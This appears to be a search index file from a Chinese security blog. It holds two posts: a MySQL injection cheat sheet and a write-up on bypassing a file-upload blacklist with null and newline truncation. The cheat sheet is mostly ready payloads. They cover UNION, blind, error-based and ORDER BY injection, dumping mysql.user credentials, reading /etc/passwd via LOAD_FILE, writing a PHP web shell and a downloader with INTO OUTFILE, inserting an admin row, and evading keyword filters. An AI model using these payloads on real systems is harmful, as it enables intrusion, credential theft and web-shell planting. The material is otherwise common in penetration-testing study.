<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[MySql注入科普]]></title>
    <url>%2Farchives%2Fad588fee.html</url>
    <content type="text"><![CDATA[默认存在的数据库：mysql 需要root权限读取information_schema 在5以上的版本中存在测试是否存在注入方法假：表示查询是错误的 (MySQL 报错/返回页面与原来不同) 真：表示查询是正常的 (返回页面与原来相同) 共三种情况： 字符串类型查询时： 数字类型查询时： 登陆时：‘ 假‘’ 真“ 假“” 真\ 假\ 真AND 1 真AND 0 假AND true 真AND false 假1-false 有问题时返回1的结果1-true 有问题时返回0的结果2-1 返回与1相同代表可能存在问题156 返回与56相同代表可能存在问题156 返回与1相同代表没有问题‘ OR ‘1‘ OR 1 – -“ OR “” = ““ OR 1 = 1 – -‘=’‘LIKE’‘=0–+例子: SELECT * FROM Users WHERE id = ‘1’’’;SELECT * FROM Users WHERE id = 3-2;SELECT * FROM Users WHERE username = ‘Mike’ AND password = ‘’ OR ‘’ = ‘’;可以使用很多单双引号，只要是成对出现。 SELECT * FROM Articles WHERE id = ‘121’’’’’’’’’’’’’引号后的语句会继续执行。 SELECT ‘1’’’’’”” UNION SELECT ‘2’ # 1 and 2下面的符号可以用来注释语句： Hash 语法/* C-style 语法– - SQL 语法;%00 空字节` 反引号例子： SELECT * FROM Users WHERE username = ‘’ OR 1=1 – -‘ AND password = ‘’;SELECT * FROM Users WHERE id = ‘’ UNION SELECT 1, 2, 3`’;测试数据库版本VERSION()@@VERSION@@GLOBAL.VERSION如果版本为5的话，下面例子返回为真： SELECT * FROM Users WHERE id = ‘1’ AND MID(VERSION(),1,1) = ‘5’;windows平台上的mysql查询与linux上返回不同，如果是windows服务器返回结果会包含 -nt-log字符。 数据库认证信息：表 mysql.user字段 user, password当前用户 user(), current_user(), current_user, system_user(), session_user()例子： SELECT current_user;SELECT CONCAT_WS(0x3A, user, password) FROM mysql.user WHERE user = ‘root’– (Privileged)数据库名：表 information_schema.schemata, mysql.db字段 schema_name, db当前数据库 database(), schema()例子： SELECT database();SELECT schema_name FROM information_schema.schemata;SELECT DISTINCT(db) FROM mysql.db;– (Privileged)服务器主机名：@@HOSTNAME例子： SELECT @@hostname;表和字段检测字段数两种方式： ORDER BY判断 ORDER BY n+1; 让n一直增加直到出现错误页面。 例子: 查询语句 SELECT username, password, permission FROM Users WHERE id = ‘1’; 1’ ORDER BY 1–+ 真 1’ ORDER BY 2–+ 真 1’ ORDER BY 3–+ 真 1’ ORDER BY 4–+ 假- 查询只用了3个字段 -1’ UNION SELECT 1,2,3–+ 真基于错误查询 AND (SELECT * FROM SOME_EXISTING_TABLE) = 1 注意: 这种方式需要你知道所要查询的表名。 这种报错方式返回表的字段数，而不是错误的查询语句。 例子： 查询语句 SELECT permission FROM Users WHERE id = 1; AND (SELECT * FROM Users) = 1 返回Users的字段数查询表名三种方式： Union方式 UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10;– MySQL 4版本时用version=9，MySQL 5版本时用version=10盲注 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables &gt; ‘A’报错 AND(SELECT COUNT() FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)));– 在5.1.5版本中成功。查询列名Union方式 UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = ‘tablename’盲注 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns &gt; ‘A’报错 AND(SELECT COUNT() FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT column_name FROM information_schema.columns LIMIT 1)));– 在5.1.5版本中成功。 AND (1,2,3) = (SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1,2,3 LIMIT 1)– MySQL 5.1版本修复了利用PROCEDURE ANALYSE() 这个需要web展示页面有你所注入查询的一个字段。 例子: 查询语句 SELECT username, permission FROM Users WHERE id = 1; 1 PROCEDURE ANALYSE() 获得第一个段名 1 LIMIT 1,1 PROCEDURE ANALYSE() 获得第二个段名 1 LIMIT 2,1 PROCEDURE ANALYSE() 获得第三个段名一次查询多个表或列SELECT (@) FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns) WHERE (table_schema&gt;=@) AND (@)IN (@:=CONCAT(@,0x0a,’ [ ‘,table_schema,’ ] &gt;’,table_name,’ &gt; ‘,column_name))))x例子： SELECT * FROM Users WHERE id = ‘-1’ UNION SELECT 1, 2, (SELECT (@) FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns) WHERE (table_schema&gt;=@) AND (@)IN (@:=CONCAT(@,0x0a,’ [ ‘,table_schema,’ ] &gt;’,table_name,’ &gt; ‘,column_name))))x), 4–+’;输出结果： [ information_schema ] &gt;CHARACTER_SETS &gt; CHARACTER_SET_NAME [ information_schema ] &gt;CHARACTER_SETS &gt; DEFAULT_COLLATE_NAME [ information_schema ] &gt;CHARACTER_SETS &gt; DESCRIPTION [ information_schema ] &gt;CHARACTER_SETS &gt; MAXLEN [ information_schema ] &gt;COLLATIONS &gt; COLLATION_NAME [ information_schema ] &gt;COLLATIONS &gt; CHARACTER_SET_NAME [ information_schema ] &gt;COLLATIONS &gt; ID [ information_schema ] &gt;COLLATIONS &gt; IS_DEFAULT [ information_schema ] &gt;COLLATIONS &gt; IS_COMPILED利用代码： SELECT MID(GROUP_CONCAT(0x3c62723e, 0x5461626c653a20, table_name, 0x3c62723e, 0x436f6c756d6e3a20, column_name ORDER BY (SELECT version FROM information_schema.tables) SEPARATOR 0x3c62723e),1,1024) FROM information_schema.columns例子： SELECT username FROM Users WHERE id = ‘-1’ UNION SELECT MID(GROUP_CONCAT(0x3c62723e, 0x5461626c653a20, table_name, 0x3c62723e, 0x436f6c756d6e3a20, column_name ORDER BY (SELECT version FROM information_schema.tables) SEPARATOR 0x3c62723e),1,1024) FROM information_schema.columns;输出结果： Table: talk_revisionsColumn: revid Table: talk_revisionsColumn: userid Table: talk_revisionsColumn: user Table: talk_projectsColumn: priority根据列名查询所在的表SELECT table_name FROM information_schema.columns WHERE column_name = ‘username’; 查询字段为username的表SELECT table_name FROM information_schema.columns WHERE column_name LIKE ‘%user%’; 查询字段中包含user的表根据表查询包含的字段SELECT column_name FROM information_schema.columns WHERE table_name = ‘Users’; 查询user表中的字段SELECT column_name FROM information_schema.columns WHERE table_name LIKE ‘%user%’; 查询包含user字符串表中的字段绕过引号限制SELECT * FROM Users WHERE username = 0x61646D696E Hex编码SELECT * FROM Users WHERE username = CHAR(97, 100, 109, 105, 110) 利用CHAR()函数绕过字符串黑名单SELECT ‘a’ ‘d’ ‘mi’ ‘n’;SELECT CONCAT(‘a’, ‘d’, ‘m’, ‘i’, ‘n’);SELECT CONCAT_WS(‘’, ‘a’, ‘d’, ‘m’, ‘i’, ‘n’);SELECT GROUP_CONCAT(‘a’, ‘d’, ‘m’, ‘i’, ‘n’);使用CONCAT()时，任何个参数为null，将返回null， 推荐使用CONCAT_WS() 。 CONCAT_WS() 函数第一个参数表示用哪个字符间隔所查询的结果。 条件语句CASEIF()IFNULL()NULLIF()例子： SELECT IF(1=1, true, false);SELECT CASE WHEN 1=1 THEN true ELSE false END;时间延迟查询：SLEEP() MySQL 5BENCHMARK() MySQL 4/5例子： ‘ - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1(‘true’)), false)) - ‘权限文件权限下面的语句可以查询用户读写文件操作权限： SELECT file_priv FROM mysql.user WHERE user = ‘username’; 需要root用户来执行 MySQL 4/5SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = ‘file’ AND grantee like ‘%username%’; 普通用户都可以 MySQL 5读取文件如果用户有文件操作权限可以读取文件： LOAD_FILE()例子： SELECT LOAD_FILE(‘/etc/passwd’);SELECT LOAD_FILE(0x2F6574632F706173737764);文件必须在服务器上。LOAD_FILE()函数操作文件的当前目录是@@datadir 。MySQL用户必须拥有对此文件读取的权限。文件大小必须小于 max_allowed_packet。@@max_allowed_packet的默认大小是1047552 字节.写文件如果用户有文件操作权限可以写文件。 INTO OUTFILE/DUMPFILE写一个php的shell： SELECT ‘‘ INTO OUTFILE ‘/var/www/shell.php’;访问如下链接： http://localhost/shell.php?c=cat%20/etc/passwd 写一个下载者： SELECT ‘‘ INTO OUTFILE ‘/var/www/get.php’访问如下链接： http://localhost/get.php?f=shell.php&amp;u=http://localhost/c99.txt INTO OUTFILE 不可以覆盖已存在的文件。INTO OUTFILE 必须是最后一个查询。引号是必须的，因为没有办法可以编码路径名。PDO堆查询方式操作数据库PHP使用PDO_MYSQL来连接数据库，便可以使用堆查询，堆查询可以同时执行多个语句。 SELECT * FROM Users WHERE ID=1 AND 1=0; INSERT INTO Users(username,password,priv) VALUES (‘BobbyTables’, ‘kl20da$$’,’admin’);MySql特有的写法MySql中，/*! SQL 语句 */ 这种格式里面的 SQL 语句会当正常的语句一样被解析。 如果在!之后是一串数字(这串数字就是 mysql 数据库的版本号), 如：/*! 12345 SQL 语句 */ 当版本号大于等于该数字,SQL 语句则执行,否则就不执行。 SELECT 1/!41320UNION/!/!/!00000SELECT/!/!USER/!(/!/!/!*/);模糊和混淆允许的字符09 Horizontal Tab0A New Line0B Vertical Tab0C New Page0D Carriage ReturnA0 Non-breaking Space20 Space例子： ‘%0A%09UNION%0CSELECT%A0NULL%20%23括号也可以用来绕过过滤空格的情况： 28 (29 )例子： UNION(SELECT(column)FROM(table))AND或OR后面可以跟的字符20 Space2B +2D -7E ~21 !40 @例子： SELECT 1 FROM dual WHERE 1=1 AND-+-+-+-+~~((1))dual是一个虚拟表，可以用来做测试。 几个针对黑名单绕过的例子基于关键字的黑名单过滤关键字 and orphp代码 preg_match(‘/(and|or)/i’,$id)会过滤的攻击代码 1 or 1=1 1 and 1=1绕过方式 1 || 1=1 1 &amp;&amp; 1=1下面这种方式你需要已经知道一些表和字段名（可以利用substring函数去一个一个获得information_schema.columns表中的数据） 过滤关键字 and or unionphp代码 preg_match(‘/(and|or|union)/i’,$id)会过滤的攻击代码 union select user,password from users绕过方式 1 &amp;&amp; (select user from users where userid=1)=’admin’过滤关键字 and or union wherephp代码 preg_match(‘/(and|or|union|where)/i’,$id)会过滤的攻击代码 1 &amp;&amp; (select user from users where user_id = 1) = ‘admin’绕过方式 1 &amp;&amp; (select user from users limit 1) = ‘admin’过滤关键字 and or union wherephp代码 preg_match(‘/(and|or|union|where)/i’,$id)会过滤的攻击代码 1 &amp;&amp; (select user from users where user_id = 1) = ‘admin’绕过方式 1 &amp;&amp; (select user from users limit 1) = ‘admin’过滤关键字 and, or, union, where, limitphp代码 preg_match(‘/(and|or|union|where|limit)/i’, $id)会过滤的攻击代码 1 &amp;&amp; (select user from users limit 1) = ‘admin’绕过方式 1 &amp;&amp; (select user from users group by user_id having user_id = 1) = ‘admin’#user_id聚合中user_id为1的user为admin过滤关键字 and, or, union, where, limit, group byphp代码 preg_match(‘/(and|or|union|where|limit|group by)/i’, $id)会过滤的攻击代码 1 &amp;&amp; (select user from users group by user_id having user_id = 1) = ‘admin’绕过方式 1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) = 1过滤关键字 and, or, union, where, limit, group by, selectphp代码 preg_match(‘/(and|or|union|where|limit|group by|select)/i’, $id)会过滤的攻击代码 1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) = 1绕过方式 1 &amp;&amp; substr(user,1,1) = ‘a’过滤关键字 and, or, union, where, limit, group by, select, ‘php代码 preg_match(‘/(and|or|union|where|limit|group by|select|&#39;)/i’, $id)会过滤的攻击代码 1 &amp;&amp; (select substr(gruop_concat(user_id),1,1) user from users) = 1绕过方式 1 &amp;&amp; user_id is not null 1 &amp;&amp; substr(user,1,1) = 0x61 1 &amp;&amp; substr(user,1,1) = unhex(61)过滤关键字 and, or, union, where, limit, group by, select, ‘, hexphp代码 preg_match(‘/(and|or|union|where|limit|group by|select|&#39;|hex)/i’, $id)会过滤的攻击代码 1 &amp;&amp; substr(user,1,1) = unhex(61)绕过方式 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。过滤关键字 and, or, union, where, limit, group by, select, ‘, hex, substrphp代码 preg_match(‘/(and|or|union|where|limit|group by|select|&#39;|hex|substr)/i’, $id)会过滤的攻击代码 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16))/td&gt;绕过方式 1 &amp;&amp; lpad(user,7,1)过滤关键字 and, or, union, where, limit, group by, select, ‘, hex, substr, 空格php代码 preg_match(‘/(and|or|union|where|limit|group by|select|&#39;|hex|substr|\s)/i’, $id)会过滤的攻击代码 1 &amp;&amp; lpad(user,7,1)/td&gt;绕过方式 1%0b||%0blpad(user,7,1)过滤关键字 and or union wherephp代码 preg_match(‘/(and|or|union|where)/i’,$id)会过滤的攻击代码 1 || (select user from users where user_id = 1) = ‘admin’绕过方式 1 || (select user from users limit 1) = ‘admin’利用正则表达式进行盲注我们都已经知道，在MYSQL 5+中 information_schema库中存储了所有的 库名，表明以及字段名信息。故攻击方式如下： 1、判断第一个表名的第一个字符是否是a-z中的字符,其中blind_sqli是假设已知的库名。 index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=”blind_sqli” AND table_name REGEXP ‘^[a-z]’ LIMIT 0,1) /*2、判断第一个字符是否是a-n中的字符 index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=”blind_sqli” AND table_name REGEXP ‘^[a-n]’ LIMIT 0,1)/*3、确定该字符为n index.php?id=1 and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=”blind_sqli” AND table_name REGEXP ‘^n’ LIMIT 0,1) /*4、表达式的更换如下 ‘^n[a-z]’ -&gt; ‘^ne[a-z]’ -&gt; ‘^new[a-z]’ -&gt; ‘^news[a-z]’ -&gt; FALSE这时说明表名为news ，要验证是否是该表明 正则表达式为’^news$’，但是没这必要 直接判断 table_name = ‘news’ 不就行了。 5、接下来猜解其它表了 只需要修改 limit 1,1 -&gt; limit 2,1就可以对接下来的表进行盲注了。 order by后的注入oder by由于是排序语句，所以可以利用条件语句做判断，根据返回的排序结果不同判断条件的真假。 一般带有oder或者orderby的变量很可能是这种注入，在知道一个字段的时候可以采用如下方式注入： 原始链接：http://www.test.com/list.php?order=vote 根据vote字段排序。 找到投票数最大的票数num然后构造以下链接： http://www.test.com/list.php?order=abs(vote-(length(user())&gt;0)*num)+asc看排序是否变化。 还有一种方法不需要知道任何字段信息，使用rand函数： http://www.test.com/list.php?order=rand(true)http://www.test.com/list.php?order=rand(false)以上两个会返回不同的排序，判断表名中第一个字符是否小于128的语句如下： http://www.test.com/list.php?order=rand((select char(substring(table_name,1,1)) from information_schema.tables limit 1)&lt;=128))宽字节注入sql注入中的宽字节国内最常使用的gbk编码，这种方式主要是绕过addslashes等对特殊字符进行转移的绕过。反斜杠()的十六进制为%5c，在你输入%bf%27时，函数遇到单引号自动转移加入\，此时变为%bf%5c%27，%bf%5c在gbk中变为一个宽字符“縗”。%bf那个位置可以是%81-%fe中间的任何字符。不止在sql注入中，宽字符注入在很多地方都可以应用。]]></content>
  </entry>
  <entry>
    <title><![CDATA[Part1:黑名单上传之00截断失败的情况下绕过(Win+Php5.4.45)]]></title>
    <url>%2Farchives%2Fd87f7e0c.html</url>
    <content type="text"><![CDATA[一、前言 大家好,我叫MaiKeFee,是一名信息安全爱好者,初次见面,先水一篇文章再说.前几天在深圳出差,遇到一个黑名单上传点(Linux+Php(版本未知)),除了Php|Aspx|Jsp|Php3等等类似脚本都试过不能上传,其余可上传;于是第一时间想到测试%00截断显然是不能上传,不然也不会有此下文. 随后随手测试了: %00截断不能上传(实战环境+Linux+nginx+php(未知版本)),但是%0a、%0d,没想到竟然能上传了!!但是很遗憾,它不解析;为了寻找原因开始搭建环境复现.. 二、环境搭建 哒哒哒,环境搭好了,接下来开始测试啦 测试环境:Win+phpstudy(PHP Version 5.4.45)+上传黑名单 1.测试%00截断(上传成功并解析) 2.接下来是测试%0a截断(上传成功并解析) 3.接下来是测试%0d截断(上传失败并报错) 三、Fuzzing 根据这样的特性,写个脚本生成Payload(%00-%99)(a-z)进行fuzzing 拿起来fuzzing就是一把梭 经过梭哈后,发现这些空payload,基本都可以绕过黑名单(%00|%0a|%8b|%8c|%8d..) 当然,要是提到黑名单绕过的姿势还是挺多的: 1.根据win的特性,空格也是可以绕过的 2.::$DATA数据流绕过,NTFS文件系统特性绕过 3.php3、php5.. 4.点号(.)绕过,Win特性 …就不一一举例,本人项目环境是(Linux+nginx),绕过黑名单,但是不解析,在Win下测试,绕过后可解析(暂没深入).. 总结:遇到00截断不成功的情况下,测试了0a可以成功绕过(估计跟php版本有关,待考察) 但是值得一提的是此文和网上提到https://www.freebuf.com/articles/web/179401.html 这里均提到版本问题,但本人测试环境Php5.4.45,可00截断并解析,这里暂时无从考证了,知道的大佬指点一下迷津!]]></content>
  </entry>
</search>
